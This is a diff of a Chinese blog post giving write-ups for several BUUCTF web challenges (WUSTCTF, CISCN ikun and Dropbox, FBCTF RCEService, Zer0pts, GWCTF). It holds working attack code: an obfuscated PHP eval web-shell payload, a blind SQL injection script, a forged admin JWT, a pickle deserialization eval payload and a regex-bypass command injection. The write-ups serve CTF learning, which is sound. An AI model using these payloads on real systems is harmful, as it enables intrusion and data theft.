@@ -24,7 +24,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://10vexh.top/null">
 <meta property="article:published_time" content="2022-02-20T15:03:57.000Z">
-<meta property="article:modified_time" content="2022-03-02T16:59:16.990Z">
+<meta property="article:modified_time" content="2022-03-12T17:40:01.123Z">
 <meta property="article:author" content="10vexh">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://10vexh.top/null">
@@ -172,7 +172,7 @@
                     <i class="fa fa-edit"></i> 
                     
                     
-                        ~17.59K
+                        ~29.04K
                     
                     字
                 </li>
@@ -181,7 +181,7 @@
         </header>
         <div class="kratos-post-content">
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
-                本文最后编辑于 <time datetime="1646240356990"></time> 前，其中的内容可能需要更新。
+                本文最后编辑于 <time datetime="1647106801123"></time> 前，其中的内容可能需要更新。
             </div>
             
             <hr />
@@ -365,7 +365,114 @@
 
 <p>发现了被禁用的函数。同时注意一下php的版本为<code>PHP Version 7.0.33</code></p>
 <p>构造payload进行注入</p>
-<p>绕过disable_functions插件可以直接帮我们绕了，选择PHP_GC_UAF模式，进入后直接读取文件即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &#x27;(~&#x27;;</span><br><span class="line">$b=&#x27;assert&#x27;;</span><br><span class="line">echo urlencode(~$b);</span><br><span class="line">echo &#x27;)(~&#x27;;</span><br><span class="line">$a=&#x27;(eval($_POST[hack]))&#x27;;</span><br><span class="line">echo urlencode(~$a);</span><br><span class="line">echo &#x27;);&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">返回：(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%97%9E%9C%94%A2%D6%D6);</span><br></pre></td></tr></table></figure>
+
+<p>绕过用蚁剑的<code>disable_functions插件</code>可以直接帮我们绕了，选择PHP_GC_UAF模式，进入后直接读取文件即可</p>
+<h2 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h2><p>经典的布尔盲注，一样用的是异或<code>1^1^1</code></p>
+<p>找的别人的脚本</p>
+<p>3.10：我发现我家网络很垃圾直接跑会一大堆问题，然后我就又写了一段来检测是不是错误的，然后手动测一下。。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=&quot;http://464c1ed6-0b5b-4663-b449-25755239b85d.node4.buuoj.cn:81/?stunum=&quot;</span><br><span class="line">name=&#x27;&#x27;</span><br><span class="line">list=[]</span><br><span class="line"></span><br><span class="line">for i in range(1,100):</span><br><span class="line">    print(i)</span><br><span class="line">    low=32</span><br><span class="line">    high=128</span><br><span class="line">    mid=(low+high)//2</span><br><span class="line">    while low&lt;high:</span><br><span class="line">        #payload = &quot;0^(ascii(substr((select(database())),%d,1))&gt;%d)&quot; % (i, mid)</span><br><span class="line">        #payload=&quot;0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;ctf&#x27;)),%d,1))&gt;%d)&quot;%(i,mid)</span><br><span class="line">        #payload=&quot;0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flag&#x27;)),%d,1))&gt;%d)&quot;%(i,mid)</span><br><span class="line">        payload=&quot;0^(ascii(substr((select(group_concat(value))from(flag)),%d,1))&gt;%d)&quot;%(i,mid)</span><br><span class="line">        r=requests.get(url=url+payload)</span><br><span class="line">        if &#x27;admin&#x27; in r.text:</span><br><span class="line">            low = mid+1</span><br><span class="line">        else:</span><br><span class="line">            high=mid</span><br><span class="line">        mid=(low+high)//2</span><br><span class="line">        if(mid==32):</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    name=name+chr(mid)</span><br><span class="line">    print (name)</span><br><span class="line">    payload = &quot;0^(ascii(substr((select(group_concat(value))from(flag)),%d,1))=%d)&quot; % (i, mid)</span><br><span class="line">    r2 = requests.get(url=url + payload)</span><br><span class="line">    if &#x27;admin&#x27; in r2.text:</span><br><span class="line">        print(&quot;yes&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(i)</span><br><span class="line">        list.append(i)</span><br><span class="line">        print(list)</span><br></pre></td></tr></table></figure>
+
+<h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><p>第一步爬页面找到<code>LV6</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=&#x27;http://dac990e8-3995-4593-96c8-e86693f176ac.node4.buuoj.cn:81/shop?page=&#x27;</span><br><span class="line"></span><br><span class="line">for i in range(1000):</span><br><span class="line">    print(i)</span><br><span class="line">    payload=url+&quot;%d&quot;%i</span><br><span class="line">    response=requests.get(payload)</span><br><span class="line">    if &#x27;lv6.png&#x27; in response.text:</span><br><span class="line">        print(url+str(i))</span><br></pre></td></tr></table></figure>
+
+<p>然后发现要花很多钱才能买。考虑抓包改。</p>
+<p>发现<code>cookie</code>存在<code>JWT</code>，<code>JWT</code>可以用<a target="_blank" rel="noopener" href="https://jwt.io/%E6%9D%A5%E8%A7%A3%E7%A0%81">https://jwt.io/来解码</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: _xsrf=2|322d4d59|4a876220ef2fb07eca66dbe3bb855680|1646404528; JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InRlc3QifQ.l0qG4XbJbemqJXsaITaT8g78fkJ-boRvU2H7H1CY644</span><br></pre></td></tr></table></figure>
+
+<p>解码完,后面还有解不出来的部分，是因为被加密了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">HEADER:ALGORITHM &amp; TOKEN TYPE</span><br><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br><span class="line">PAYLOAD:DATA</span><br><span class="line">&#123;</span><br><span class="line">  &quot;username&quot;: &quot;test&quot;</span><br><span class="line">&#125;</span><br><span class="line">VERIFY SIGNATURE</span><br><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + &quot;.&quot; +</span><br><span class="line">  base64UrlEncode(payload),</span><br><span class="line">  your-256-bit-secret</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>然后抓包修改折扣会发现有个只能admin访问的页面。<code>/b1g_m4mber</code></p>
+<p>因此我们构造一个为admin的<code>JWT</code>，然后利用<a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./jwtcrack 加密后的结果</span><br></pre></td></tr></table></figure>
+
+<p>来破解key,密钥为<code>1Kun</code></p>
+<p>构造jwt来传参</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo</span><br></pre></td></tr></table></figure>
+
+<p>进入<code>/b1g_m4mber</code>，在备注里有源码。审计源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import tornado.web</span><br><span class="line">from sshop.base import BaseHandler</span><br><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class AdminHandler(BaseHandler):</span><br><span class="line">    @tornado.web.authenticated</span><br><span class="line">    def get(self, *args, **kwargs):</span><br><span class="line">        if self.current_user == &quot;admin&quot;:</span><br><span class="line">            return self.render(&#x27;form.html&#x27;, res=&#x27;This is Black Technology!&#x27;, member=0)</span><br><span class="line">        else:</span><br><span class="line">            return self.render(&#x27;no_ass.html&#x27;)</span><br><span class="line"></span><br><span class="line">    @tornado.web.authenticated</span><br><span class="line">    def post(self, *args, **kwargs):</span><br><span class="line">        try:</span><br><span class="line">            become = self.get_argument(&#x27;become&#x27;)</span><br><span class="line">            p = pickle.loads(urllib.unquote(become))</span><br><span class="line">            return self.render(&#x27;form.html&#x27;, res=p, member=1)</span><br><span class="line">        except:</span><br><span class="line">            return self.render(&#x27;form.html&#x27;, res=&#x27;This is Black Technology!&#x27;, member=0)</span><br><span class="line">            #在此利用post传参进行become的读取并且进行反序列化，我们可以在反序列化的过程中来进行注入</span><br></pre></td></tr></table></figure>
+
+<p>这里有了新的知识点<code>Python</code>的反序列化。</p>
+<p><code>Python</code>中有个库可以实现序列化和反序列化操作，名为<code>pickle(纯python实现)</code>或<code>cPickle(C实现)</code>，作用和<code>PHP</code>的<code>serialize</code>与<code>unserialize</code>一样。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">Pickle模块中最常用的函数为：</span><br><span class="line"></span><br><span class="line">（1）pickle.dump(obj, file, [,protocol])</span><br><span class="line"></span><br><span class="line">        函数的功能：将obj对象序列化存入已经打开的file中。</span><br><span class="line"></span><br><span class="line">       参数讲解：</span><br><span class="line"></span><br><span class="line">    obj：想要序列化的obj对象。</span><br><span class="line">    file:文件名称。</span><br><span class="line">    protocol：序列化使用的协议。如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。</span><br><span class="line"></span><br><span class="line">（2）pickle.load(file)</span><br><span class="line"></span><br><span class="line">        函数的功能：将file中的对象序列化读出。</span><br><span class="line"></span><br><span class="line">        参数讲解：</span><br><span class="line"></span><br><span class="line">    file：文件名称。</span><br><span class="line"></span><br><span class="line">（3）pickle.dumps(obj[, protocol])</span><br><span class="line"></span><br><span class="line">       函数的功能：将obj对象序列化为string形式，而不是存入文件中。</span><br><span class="line"></span><br><span class="line">       参数讲解：</span><br><span class="line"></span><br><span class="line">    obj：想要序列化的obj对象。</span><br><span class="line">    protocal：如果该项省略，则默认为0。如果为负值或HIGHEST_PROTOCOL，则使用最高的协议版本。</span><br><span class="line"></span><br><span class="line">（4）pickle.loads(string)</span><br><span class="line"></span><br><span class="line">       函数的功能：从string中读出序列化前的obj对象。</span><br><span class="line"></span><br><span class="line">       参数讲解：</span><br><span class="line"></span><br><span class="line">    string：文件名称。</span><br><span class="line"></span><br><span class="line">     【注】 dump() 与 load() 相比 dumps() 和 loads() 还有另一种能力：dump()函数能一个接着一个地将几个对象序列化存储到同一个文件中，随后调用load()来以同样的顺序反序列化读出这些对象。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>我们可以构造反序列化后产生的对象在结束时触发<code>__reduce__()</code>函数从而触发恶意代码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#注意这里要用py2的环境</span><br><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line">class payload(object):</span><br><span class="line">	def __reduce__(self):</span><br><span class="line">		return eval,(&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;,)</span><br><span class="line">payload=payload()</span><br><span class="line">a=pickle.dumps(payload)</span><br><span class="line">print(a)</span><br><span class="line">a=urllib.quote(a,&#x27;utf-8&#x27;)</span><br><span class="line">print(a)</span><br><span class="line">#返回：c__builtin__</span><br><span class="line">eval</span><br><span class="line">p0</span><br><span class="line">(S&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;</span><br><span class="line">p1</span><br><span class="line">tp2</span><br><span class="line">Rp3</span><br><span class="line">.</span><br><span class="line">c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27%2Fflag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</span><br></pre></td></tr></table></figure>
+
+<p>直接抓包修改become的值得到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_xsrf=2%7Cf2d4b1e7%7C7e3e5266afd7b8469915a0f9fdd83ed6%7C1646500517&amp;become=c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27%2Fflag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</span><br></pre></td></tr></table></figure>
+
+<h2 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h2><p>审计源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">putenv(&#x27;PATH=/home/rceservice/jail&#x27;);</span><br><span class="line"></span><br><span class="line">if (isset($_REQUEST[&#x27;cmd&#x27;])) &#123;  //利用cmd读入命令</span><br><span class="line">  $json = $_REQUEST[&#x27;cmd&#x27;];</span><br><span class="line"></span><br><span class="line">  if (!is_string($json)) &#123;</span><br><span class="line">    echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;;</span><br><span class="line">  &#125; elseif (preg_match(&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;, $json)) &#123;</span><br><span class="line">    echo &#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    echo &#x27;Attempting to run command:&lt;br/&gt;&#x27;;</span><br><span class="line">    $cmd = json_decode($json, true)[&#x27;cmd&#x27;];</span><br><span class="line">    if ($cmd !== NULL) &#123;</span><br><span class="line">      system($cmd);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      echo &#x27;Invalid input&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &#x27;&lt;br/&gt;&lt;br/&gt;&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>由于<code>preg_match()</code>函数只能匹配第一行数据，可以使用换行符<code>%0a</code>绕过，payload：</p>
+<p>（这里为什么要是用<code>/bin/cat</code>，审计代码会发现，刚开始设置了路径，所以在这里我们要使用<code>cat</code>的绝对路径，那为什么<code>ls</code>可以用呢，猜测应该是ls的二进制在目录下）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=&#123;%0a&quot;cmd&quot;:&quot;/bin/cat%20/home/rceservice/flag&quot;%0a&#125;</span><br></pre></td></tr></table></figure>
+
+<p>题目的预期解是<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PHP利用PCRE回溯次数限制绕过某些安全限制</a></p>
+<p>就说当需要检测的正则数大于1000000，正则表达式就会失效。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">payload = &#x27;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;test&quot;:&quot;&#x27; + &quot;a&quot;*(1000000) + &#x27;&quot;&#125;&#x27;</span><br><span class="line">res = requests.post(&quot;http://ad66432f-4628-41f6-8190-d9b9c247904c.node3.buuoj.cn/&quot;, data=&#123;&quot;cmd&quot;:payload&#125;)</span><br><span class="line">#print(payload)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h2><p>看源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;config.php&#x27;; // FLAG is defined in config.php</span><br><span class="line"></span><br><span class="line">if (preg_match(&#x27;/config\.php\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123;</span><br><span class="line">  exit(&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;);</span><br><span class="line">&#125;//如果相对路径存在config.php，则会exit</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;source&#x27;])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;]));</span><br><span class="line">  exit();</span><br><span class="line">&#125;//利用basename取得文件名</span><br><span class="line"></span><br><span class="line">$secret = bin2hex(random_bytes(64));</span><br><span class="line">if (isset($_POST[&#x27;guess&#x27;])) &#123;</span><br><span class="line">  $guess = (string) $_POST[&#x27;guess&#x27;];</span><br><span class="line">  if (hash_equals($secret, $guess)) &#123;</span><br><span class="line">    $message = &#x27;Congratulations! The flag is: &#x27; . FLAG;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    $message = &#x27;Wrong.&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>变量属性-PHP_SELF</strong></p>
+<p><code>$_SERVER[‘PHP_SELF’]</code> 获取当前页面地址，是当前 php 文件相对于网站根目录的位置地址</p>
+<p><code>/php/index.php</code></p>
+<p><code>$_SERVER[‘REQUEST_URI’]</code>完整url地址，包括请求的url参数</p>
+<p><code>$_SERVER[‘HTTP_HOST’]</code>只是一段的域名，不包括前面的协议和后面的相对位置</p>
+<p>同时还有一个<code>basename()</code>函数</p>
+<p><code>basename()</code> 函数会返回路径中的文件名部分</p>
+<p>假如路径是<code>/index.php/config.php</code><br>浏览器的解析结果都是<code>index.php</code><br>而<code>basename</code>会返回<code>config.php</code></p>
+<p>就算后面跟上多余的字符也会返回文件名部分</p>
+<p><code>basename()</code>函数存在一个问题，它会去掉文件名开头的非ASCII值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(basename(&quot;xffconfig.php&quot;)); // =&gt; config.php</span><br><span class="line">var_dump(basename(&quot;config.php/xff&quot;)); // =&gt; config.php</span><br></pre></td></tr></table></figure>
+
+<p>最后构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php/config.php/%80?source</span><br></pre></td></tr></table></figure>
+
+<h2 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h2><p>涉及到知识点，伪随机数</p>
+<blockquote>
+<p>mt_scrand(seed)函数通过分发seed种子，然后种子有了后，靠mt_rand()生成随机数。<br>举个例子，两次随机数生成竟然是存在一样的。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(11);</span><br><span class="line">echo mt_rand();</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">输出：387126220</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">mt_srand(11);</span><br><span class="line">echo mt_rand();</span><br><span class="line">echo mt_rand();</span><br><span class="line">echo mt_rand();</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">输出：38712622014668783941822760</span><br></pre></td></tr></table></figure>
+
+<p>因此可以发现随机数可以预测。</p>
+<p>可以利用工具 <a target="_blank" rel="noopener" href="https://www.openwall.com/php_mt_seed/">php_mt_seed</a>来确定随机数种子</p>
+<p>放入<code>kali</code>后<code>make</code>得到文件</p>
+<p>利用脚本将我们的key转为工具可以识别的数组</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">str1=&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class="line">str2=&#x27;toUBVBpm7u&#x27;</span><br><span class="line">str3 = str1[::-1]</span><br><span class="line">length = len(str2)</span><br><span class="line">res=&#x27;&#x27;</span><br><span class="line">for i in range(len(str2)):  </span><br><span class="line">    for j in range(len(str1)):</span><br><span class="line">        if str2[i] == str1[j]:</span><br><span class="line">            res+=str(j)+&#x27; &#x27;+str(j)+&#x27; &#x27;+&#x27;0&#x27;+&#x27; &#x27;+str(len(str1)-1)+&#x27; &#x27;</span><br><span class="line">            break</span><br><span class="line">print(res)</span><br><span class="line"></span><br><span class="line">#得到：19 19 0 61 14 14 0 61 56 56 0 61 37 37 0 61 57 57 0 61 37 37 0 61 15 15 0 61 12 12 0 61 33 33 0 61 20 20 0 61 </span><br></pre></td></tr></table></figure>
+
+<p>然后在kali中执行得到种子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./php_mt_seed 19 19 0 61 14 14 0 61 56 56 0 61 37 37 0 61 57 57 0 61 37 37 0 61 15 15 0 61 12 12 0 61 33 33 0 61 20 20 0 61 </span><br><span class="line"></span><br><span class="line">#得到：430200554</span><br></pre></td></tr></table></figure>
+
+<p>将这个种子带入题目的加密（由于我们爆破出来的是在php7.1以上的版本，因此我们这个程序在跑的时候也应当在该环境下）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(430200554);</span><br><span class="line">$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">$str=&#x27;&#x27;;</span><br><span class="line">$len1=20;</span><br><span class="line">for ( $i = 0; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">$str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;.$str.&quot;&lt;/p&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">#得到完整的：toUBVBpm7uPiQddtYDf2</span><br></pre></td></tr></table></figure>
+
+<h2 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h2><p><code>phar</code>就是<code>php</code>的压缩文件，它可以把多个文件归档到同一个文件中，而且不经过解压就能被 <code>php</code> 访问并执行，与<code>file://</code> ，<code>php://</code>等类似，也是一种流包装器。</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11403397.html#%E5%85%ADphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">Phar反序列化</a></p>
+<p>利用条件：</p>
+<blockquote>
+<p>1.phar文件要能够上传到服务器端。<br>2.要有可用的魔术方法作为“跳板”。<br>3.文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。</p>
+</blockquote>
